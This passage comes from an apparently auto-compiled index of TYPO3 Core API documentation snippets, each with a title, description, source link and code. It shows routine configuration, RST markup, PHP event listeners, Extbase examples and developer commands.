interpreted by an operating system's protocol handler.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/CustomLinkHandlers.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<a href=\"github:123\">Example Link</a>\n```\n\n----------------------------------------\n\nTITLE: RST Database Index Entry\nDESCRIPTION: RST index entries for database-related concepts\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Introduction/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: RST\nCODE:\n```\n..  index::\n    Database;  Low-level calls\n    DataHandler\n```\n\n----------------------------------------\n\nTITLE: Legacy Hook Reference in TYPO3\nDESCRIPTION: Reference to the deprecated TYPO3 hook that was previously used for post-logout processing, replaced by AfterUserLoggedOutEvent in version 12.3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/AfterUserLoggedOutEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['t3lib/class.t3lib_userauth.php']['logoff_post_processing']\n```\n\n----------------------------------------\n\nTITLE: Displaying Extension Scanner Report Figure in RST\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the TYPO3 Extension Scanner Report interface with shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/ExtensionScannerReport.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/ExtensionScannerReport.png\n   :class: with-shadow\n\n   View extension scanner report\n```\n\n----------------------------------------\n\nTITLE: Preventing Clickjacking with TypoScript HTTP Header\nDESCRIPTION: This snippet shows how to add the X-Frame-Options HTTP header using TypoScript to prevent clickjacking attacks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesIntegrators/Typoscript.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nconfig.additionalHeaders = X-Frame-Options: SAMEORIGIN\n```\n\n----------------------------------------\n\nTITLE: TCA Configuration for Foreign Table Reference\nDESCRIPTION: PHP configuration defining a reference field to a foreign table in TCA.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n<?php\nuse TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility;\n\nExtensionManagementUtility::addTCAcolumns('tt_content',\n    array(\n        'myextension_reference' => array(\n            'exclude' => 1,\n            'label' => 'LLL:EXT:myextension/Resources/Private/Language/locallang_db.xlf:tt_content.myextension_reference',\n            'config' => array(\n                'type' => 'select',\n                'renderType' => 'selectSingle',\n                'foreign_table' => 'tx_myextension_mytable',\n                'foreign_table_where' => 'AND tx_myextension_mytable.pid = ###PAGE_TSCONFIG_ID### AND tx_myextension_mytable.sys_language_uid IN (-1,0)',\n                'size' => 1,\n                'minitems' => 0,\n                'maxitems' => 1,\n            )\n        )\n    )\n);\n```\n\n----------------------------------------\n\nTITLE: Enabling Page UID Direct Input in TYPO3 LinkHandler\nDESCRIPTION: Configuration to enable a direct page UID input field in the link browser interface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Linkhandler/PageLinkHandler.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nTCEMAIN.linkHandler.page.configuration.pageIdSelector.enabled = 1\n```\n\n----------------------------------------\n\nTITLE: Enabling Required PHP Extensions in php.ini for Windows\nDESCRIPTION: Shows the correct syntax for enabling the fileinfo and openssl PHP extensions on Windows-based servers by adding or uncommenting lines in the php.ini file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/PHP.rst#2025-04-16_snippet_1\n\nLANGUAGE: INI\nCODE:\n```\nextension=php_fileinfo.dll\nextension=php_openssl.dll\n```\n\n----------------------------------------\n\nTITLE: Defining TYPO3 Backend Live Search Event Class\nDESCRIPTION: Defines a PSR-14 event class ModifyResultItemInLiveSearchEvent with a getter method that returns a live search result item. This event allows modification of search results in the TYPO3 backend live search functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyResultItemInLiveSearchEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\Search\\Event;\n\nclass ModifyResultItemInLiveSearchEvent\n{\n    public function getResultItem(): \\TYPO3\\CMS\\Backend\\Search\\LiveSearch\\ResultItem\n    {\n        // Implementation details not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing fluid_styled_content via Composer\nDESCRIPTION: Command to install the required fluid_styled_content system extension via Composer\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_0\n\nLANGUAGE: console\nCODE:\n```\ncomposer req typo3/cms-fluid-styled-content\n```\n\n----------------------------------------\n\nTITLE: Including Example Implementation\nDESCRIPTION: RST directive to include an example implementation file for the event listener\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyButtonBarEvent.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  literalinclude:: _ModifyButtonBarEvent/_MyEventListener.php\n    :language: php\n    :caption: EXT:my_extension/Classes/Backend/EventListener/MyEventListener.php\n```\n\n----------------------------------------\n\nTITLE: Using Environment Variables in TYPO3 Site Configuration Conditions (YAML)\nDESCRIPTION: Shows how to properly quote environment variables when using them in conditions within TYPO3 site configuration. This example compares the value of 'my_env' environment variable to a string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/UsingEnvVars.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ncondition: '\"%env(my_env)%\" == \"my_comparison_string\"'\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents in reStructuredText for TYPO3 Composer Migration\nDESCRIPTION: This snippet defines a table of contents using reStructuredText syntax. It includes sections for requirements, migration steps, asset migration, and version control related to migrating a TYPO3 project to Composer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n.. toctree::\n   :maxdepth: 2\n\n   Requirements\n   MigrationSteps\n   AssetMigration\n   VersionControl\n```\n\n----------------------------------------\n\nTITLE: Implementing a Listener for AfterFormDefinitionLoadedEvent in TYPO3\nDESCRIPTION: Example implementation of an event listener that modifies a form definition after it has been loaded. This demonstrates how to register a listener using PHP attributes and modify form properties based on specific conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Form/AfterLinkResolvedByStringRepresentationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListener;\n\nuse TYPO3\\CMS\\Form\\Mvc\\Persistence\\Event\\AfterFormDefinitionLoadedEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(AfterFormDefinitionLoadedEvent $event): void\n    {\n        $persistenceIdentifier = $event->getPersistenceIdentifier();\n        $formDefinition = $event->getFormDefinition();\n\n        // Only handle a specific form\n        if ($persistenceIdentifier !== 'EXT:my_extension/Resources/Forms/MyForm.yaml') {\n            return;\n        }\n\n        // Add additional fields\n        if (isset($formDefinition['renderables'][0]['renderables'])) {\n            $formDefinition['renderables'][0]['renderables'][] = [\n                'identifier' => 'additionalField',\n                'type' => 'Text',\n                'label' => 'This field has been added via AfterFormDefinitionLoadedEvent',\n            ];\n        }\n\n        $event->setFormDefinition($formDefinition);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering SEL Provider in TYPO3\nDESCRIPTION: Configuration file to register a custom Symfony Expression Language provider for TypoScript context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SymfonyExpressionLanguage/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'typoscript' => [\n        \\MyVendor\\SomeExtension\\ExpressionLanguage\\CustomTypoScriptConditionProvider::class,\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents Structure for FAL Administration in reStructuredText\nDESCRIPTION: This code snippet defines the structure of the TYPO3 FAL Administration documentation using reStructuredText formatting. It includes the page title and a table of contents with links to subsections on Permissions, Storages, and Maintenance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Administration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n\n..  _fal-administration:\n\n==============\nAdministration\n==============\n\n\n..  toctree::\n\n    Permissions\n    Storages\n    Maintenance\n```\n\n----------------------------------------\n\nTITLE: Inline Comments and PHP Documentation\nDESCRIPTION: Shows the style for writing inline comments in PHP that precede the line they refer to, along with PHP doc style for class constants and variables.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\nprotected function processSubmission()\n{\n    $context = GeneralUtility::makeInstance(Context::class);\n    // Check if user is logged in\n    if ($context->getPropertyFromAspect('frontend.user', 'isLoggedIn')) {\n        …\n    }\n}\n\n/** Number of images submitted by user */\nprotected $numberOfImages;\n\n/**\n * Local instance of the ContentObjectRenderer class\n *\n * @var ContentObjectRenderer\n */\nprotected $localCobj;\n```\n\n----------------------------------------\n\nTITLE: Original Core Patch Format\nDESCRIPTION: Example of a patch downloaded directly from TYPO3's review system. This shows the original format with web-root relative paths and test files that need to be adjusted before use with composer-patches.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/ApplyingCorePatches/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\ndiff --git a/typo3/sysext/core/Classes/Utility/GeneralUtility.php b/typo3/sysext/core/Classes/Utility/GeneralUtility.php\nindex be47cfe..08fd6fc 100644\n--- a/typo3/sysext/core/Classes/Utility/GeneralUtility.php\n+++ b/typo3/sysext/core/Classes/Utility/GeneralUtility.php\n@@ -2282,17 +2282,24 @@\n      */\n     public static function createVersionNumberedFilename($file)\n     {\n+        $isFrontend = ($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n+            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend();\n         $lookupFile = explode('?', $file);\n         $path = $lookupFile[0];\n-        if (($GLOBALS['TYPO3_REQUEST'] ?? null) instanceof ServerRequestInterface\n-            && ApplicationType::fromRequest($GLOBALS['TYPO3_REQUEST'])->isFrontend()\n-        ) {\n+        if ($isFrontend) {\n             $mode = strtolower($GLOBALS['TYPO3_CONF_VARS']['FE']['versionNumberInFilename']);\n             if ($mode === 'embed') {\n                 $mode = true;\ndiff --git a/typo3/sysext/core/Tests/Unit/Utility/GeneralUtilityTest.php b/typo3/sysext/core/Tests/Unit/Utility/GeneralUtilityTest.php\nindex 68e356e..0ef4b80 100644\n--- a/typo3/sysext/core/Tests/Unit/Utility/GeneralUtilityTest.php\n+++ b/typo3/sysext/core/Tests/Unit/Utility/GeneralUtilityTest.php\n@@ -4099,4 +4102,42 @@\n\n         self::assertMatchesRegularExpression('/^.*\\/tests\\/' . $uniqueFilename . '\\.[0-9]+\\.css/', $versionedFilename);\n     }\n+\n+    /**\n+     * @test\n+     */\n+    public function createVersionNumberedFilenameKeepsInvalidAbsolutePathInFrontendAndAddsQueryString(): void\n+    {\n+        doSomething();\n+    }\n```\n\n----------------------------------------\n\nTITLE: Logging a Simple Warning Message in TYPO3\nDESCRIPTION: Example of logging a simple warning message using the logger in a TYPO3 extension. This uses the warning() method which corresponds to LogLevel::WARNING severity.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Quickstart/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$this->logger->warning('Something went awry, check your configuration!');\n```\n\n----------------------------------------\n\nTITLE: Displaying Classes Directory Structure of EXT:tea Extension\nDESCRIPTION: Shows the subdirectory structure within the Classes folder, which follows the MVC pattern with Controller, Domain (containing Model and Repository), and ViewHelpers folders.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/DirectoryStructure.rst#2025-04-16_snippet_1\n\nLANGUAGE: none\nCODE:\n```\n$ tree path/to/extension/tea\n├── Classes\n    ├── Controller\n    ├── Domain\n    |   ├── Model\n    |   └── Repository\n    └──  ViewHelpers\n```\n\n----------------------------------------\n\nTITLE: Basic BitSet Usage Example in TYPO3\nDESCRIPTION: Demonstrates basic usage of the TYPO3 BitSet class with global constants to handle boolean flags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/BitSets/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\ndefine('FLAG_NONE', 0b000);\ndefine('FLAG_ONE', 0b001);\ndefine('FLAG_TWO', 0b010);\ndefine('FLAG_THREE', 0b100);\n\n$bitSet = new \\TYPO3\\CMS\\Core\\Type\\BitSet(FLAG_NONE);\n\n// Set some flags\n$bitSet->set(FLAG_ONE | FLAG_THREE);\n\n// Test if flags are set\n$bitSet->get(FLAG_ONE); // true\n$bitSet->get(FLAG_TWO); // false\n$bitSet->get(FLAG_THREE); // true\n\n// Remove a flag\n$bitSet->remove(FLAG_THREE);\n$bitSet->get(FLAG_THREE); // false\n```\n\n----------------------------------------\n\nTITLE: ReStructuredText Documentation Header for TYPO3 MVC Events\nDESCRIPTION: ReStructuredText markup defining the documentation structure for TYPO3 Extbase MVC events, including includes, index definitions, and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Mvc/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Extbase Mvc\n..  _eventlist-extbase-mvc:\n\n===\nMvc\n===\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:extbase, namespace Mvc.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Accessing TCA Global Array in PHP\nDESCRIPTION: This snippet shows how to access the TCA global array in PHP. The TCA (Table Configuration Array) is a fundamental configuration array in TYPO3 that defines how database tables should be displayed and handled in the TYPO3 backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/StoringChanges/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$GLOBALS['TCA']\n```\n\n----------------------------------------\n\nTITLE: Subpage Template with Two Columns in HTML\nDESCRIPTION: Demonstrates a Fluid template for a subpage with a two-column layout, using sections and partials.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"PageLayout\" />\n<f:section name=\"Main\">\n    <main>\n        <div class=\"container\">\n            <div class=\"row\">\n                <div class=\"col-md-9 col-xl-8\">\n                    <f:render partial=\"Content\" section=\"Column0\" arguments=\"{_all}\" />\n                </div>\n                <div class=\"col-md-3 col-xl-4\">\n                    <f:render partial=\"Content\" section=\"Column1\" arguments=\"{_all}\" />\n                </div>\n            </div>\n        </div>\n    </main>\n</f:section>\n```\n\n----------------------------------------\n\nTITLE: Inserting Figure for File Mounts Module in TYPO3 Documentation\nDESCRIPTION: This RST directive inserts a figure showing the File Mounts module interface in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_11\n\nLANGUAGE: rst\nCODE:\n```\n..  figure:: /Images/ManualScreenshots/UserManagement/Module/FileMounts.png\n    :alt: Screenshot of the Module \"Backend Users\", submodule \"File mounts\" in the TYPO3 Backend\n```\n\n----------------------------------------\n\nTITLE: Readonly Service Class Declaration in PHP\nDESCRIPTION: This snippet illustrates how to declare an entire service class as readonly in PHP.  By declaring the class `UserController` as readonly, all its properties become implicitly readonly, ensuring that the service is stateless. This can improve code clarity and prevent unintended side effects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/PhpArchitecture/Readonly.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n \"final readonly class UserController\n    {\n        public function __construct(\n            private SomeDependency $someDependency,\n        ) {}\n\n        // ...\n    }\"\n```\n\n----------------------------------------\n\nTITLE: Setting TYPO3_CONTEXT in .env file\nDESCRIPTION: Example of setting the Application Context to a Development sub-context in a .env file for Composer-based installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/SystemSettings/ApplicationContext/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nTYPO3_CONTEXT=Development/Dev1\n```\n\n----------------------------------------\n\nTITLE: Incorrect Class Constant Naming Example in PHP\nDESCRIPTION: Illustrates an improperly named class constant, highlighting the lack of clarity caused by the use of abbreviations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\nconst UL_MEMBER = 1;\n```\n\n----------------------------------------\n\nTITLE: Extension Code Using Deprecated Methods in PHP\nDESCRIPTION: Example extension code demonstrating various ways of calling a deprecated method, showing which calls will be detected by the scanner and how.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/ExtensionScanner.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace My\\Extension\\Consumer;\n\nuse TYPO3\\CMS\\Core\\Utility\\SomeUtility;\n\nclass SomeClass\n{\n    public function someMethod()\n    {\n        // \"Strong\" match: Full class combination and method call matches\n        \\TYPO3\\CMS\\Core\\Utility\\SomeUtility::someMethod();\n\n        // \"Strong\" match: Full class combination and method call matches\n        \\TYPO3\\CMS\\Core\\Utility\\SomeUtility::someMethod('foo');\n\n        // \"Strong\" match: Use statements are resolved\n        SomeUtility::someMethod('foo');\n\n        // \"Weak\" match: Scanner does not know if $foo is class \"SomeUtility\", but method name matches\n        $foo = '\\TYPO3\\CMS\\Core\\Utility\\SomeOtherUtility';\n        $foo::someMethod();\n\n        // No match: The method is static but called dynamically\n        $foo->someMethod();\n\n        // No match: The method is called with too many arguments\n        SomeUtility::someMethod('foo', 'bar');\n\n        // No match: A different method is called\n        SomeUtility::someOtherMethod();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating Code Snippets with DDEV for TYPO3 Documentation\nDESCRIPTION: Commands for generating code snippets using DDEV environment. This sequence starts DDEV, installs dependencies with Composer, and runs the TYPO3 codesnippet command to create documentation snippets in the specified directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/CONTRIBUTING.md#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nddev start\nddev composer install\nddev exec .Build/vendor/bin/typo3 codesnippet:create Documentation/CodeSnippets/\n```\n\n----------------------------------------\n\nTITLE: Extbase Persistence Classes Configuration\nDESCRIPTION: This code snippet illustrates the purpose and location of the `Classes.php` file within a TYPO3 extension. This file is used to define the mapping between database tables and corresponding Extbase model classes, overriding the default naming convention-based mapping. It resides in `/Configuration/Extbase/Persistence/Classes.php`.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/Extbase/Persistence/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\n    :scope: extension\n    :path: /Configuration/Extbase/Persistence/Classes.php\n    :regex: /^.*Configuration\\/Extbase\\/Persistence\\/Classes\\.php$/\n    :shortDescription: Contains the mapping between a database table and its Extbase model\n\n```\n\n----------------------------------------\n\nTITLE: RST Include Directive\nDESCRIPTION: Includes external RST file containing common definitions and settings\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/Database.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Running PHPStan in TYPO3 Projects\nDESCRIPTION: Bash commands to run PHPStan and generate a baseline for static analysis in TYPO3 projects.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/ProjectTesting.rst#2025-04-16_snippet_5\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/phpstan --configuration=Build/phpstan/phpstan.neon\n```\n\nLANGUAGE: Bash\nCODE:\n```\nvendor/bin/phpstan \\\n    --configuration=Build/phpstan/phpstan.neon \\\n    --generate-baseline=Build/phpstan/phpstan-baseline.neon\n```\n\n----------------------------------------\n\nTITLE: Extbase Transient Annotation Example\nDESCRIPTION: This code demonstrates the `Transient` annotation in Extbase. It prevents a model property from being persisted in the database, marking it as transient.  This is useful for properties that are only used during runtime and should not be stored.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\n\nclass Post extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var string\n     */\n    protected $content = '';\n\n    /**\n     * @Extbase\\ORM\\Transient\n     * @var bool\n     */\n    protected $dummyProperty = false;\n\n    /**\n     * Returns the title\n     *\n     * @return string $title\n     */\n    public function getTitle()\n    {\n        return $this->title;\n    }\n\n    /**\n     * Sets the title\n     *\n     * @param string $title\n     * @return void\n     */\n    public function setTitle(string $title)\n    {\n        $this->title = $title;\n    }\n\n    /**\n     * Returns the content\n     *\n     * @return string $content\n     */\n    public function getContent()\n    {\n        return $this->content;\n    }\n\n    /**\n     * Sets the content\n     *\n     * @param string $content\n     * @return void\n     */\n    public function setContent(string $content)\n    {\n        $this->content = $content;\n    }\n\n    /**\n     * Returns the dummyProperty\n     *\n     * @return bool $dummyProperty\n     */\n    public function getDummyProperty()\n    {\n        return $this->dummyProperty;\n    }\n\n    /**\n     * Sets the dummyProperty\n     *\n     * @param bool $dummyProperty\n     * @return void\n     */\n    public function setDummyProperty(bool $dummyProperty)\n    {\n        $this->dummyProperty = $dummyProperty;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents Tree\nDESCRIPTION: RST directive for creating a table of contents that includes all files in the current directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Install/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: Creating RST Reference Label for Backend Users Submodule\nDESCRIPTION: This RST directive creates a reference label for the Backend Users submodule section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: rst\nCODE:\n```\n..  _user-management-backend-users-main:\n```\n\n----------------------------------------\n\nTITLE: Executing Shell Commands for TYPO3 Setup\nDESCRIPTION: The snippet demonstrates basic shell commands to navigate directories, list contents, and set up a TYPO3 instance using Composer. It specifically uses commands like 'cd', 'ls', and 'composer install' to prepare the environment for unit testing within a TYPO3 setup.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nlolli@apoc /var/www/local/git/enetcache $ cd .Build/\nlolli@apoc /var/www/local/git/enetcache/.Build $ ls\nbin  vendor  Web\nlolli@apoc /var/www/local/git/enetcache/.Build $ ls Web/\nindex.php  typo3  typo3conf\nlolli@apoc /var/www/local/git/enetcache/.Build $ ls Web/typo3/sysext/\nbackend  Core  Extbase  fluid  frontend\nlolli@apoc /var/www/local/git/enetcache/.Build $ ls -l Web/typo3conf/ext/\ntotal 0\nlrwxrwxrwx 1 lolli www-data 29 Nov  5 14:19 enetcache -> /var/www/local/git/enetcache/\n```\n\n----------------------------------------\n\nTITLE: Defining Table of Contents for Localization in reStructuredText\nDESCRIPTION: This snippet defines a table of contents for the localization section using reStructuredText syntax. It includes all files in the current directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: reStructuredText\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: CountryFilter Class Definition\nDESCRIPTION: Class definition for CountryFilter in TYPO3\\CMS\\Core\\Country namespace that provides methods to filter countries. Includes getters and setters for excluded and allowed countries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryFilter.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Country;\n\nclass CountryFilter {\n    public function getExcludeCountries(): array {}\n    \n    public function setExcludeCountries(array $excludeCountries): CountryFilter {}\n    \n    public function getOnlyCountries(): array {}\n    \n    public function setOnlyCountries(array $onlyCountries): CountryFilter {}\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Row Data in BeforeFlexFormDataStructureIdentifierInitializedEvent\nDESCRIPTION: This method returns the entire database row of the current record.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: getRow()\n    :returns: `array`\n\n    Returns the whole database row of the current record.\n```\n\n----------------------------------------\n\nTITLE: Referencing Page Type Constants in TYPO3 Core API (PHP)\nDESCRIPTION: This snippet shows where the predefined page types are defined as constants in the TYPO3 Core API. These constants are used throughout the system to identify and work with different page types.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Domain\\Repository\\PageRepository\n```\n\n----------------------------------------\n\nTITLE: Implementing Deprecation in TYPO3 Extension Method\nDESCRIPTION: This snippet shows how to properly deprecate a method in a TYPO3 extension. It includes both a doc comment and a trigger_error() call to mark the method as deprecated.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Deprecation/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n/**\n * @deprecated since version 3.0.4, will be removed in version 4.0.0\n */\npublic function decreaseColPosCountByRecord(array $record, int $dec = 1): int\n{\n    trigger_error(\n        'Method \"decreaseColPosCountByRecord\" is deprecated since version 3.0.4, will be removed in version 4.0.0',\n        E_USER_DEPRECATED\n    );\n\n    // ... more logic\n}\n```\n\n----------------------------------------\n\nTITLE: Constructing URI with Extbase Arguments\nDESCRIPTION: This snippet demonstrates how to construct a URL using Extbase's URI argument scheme, passing necessary parameters for controller actions. It shows an example of the URI format and mentions how parameters should be URL-encoded. The output represents a practical example of invoking the 'showAction' of a specified controller.\nSOURCE: 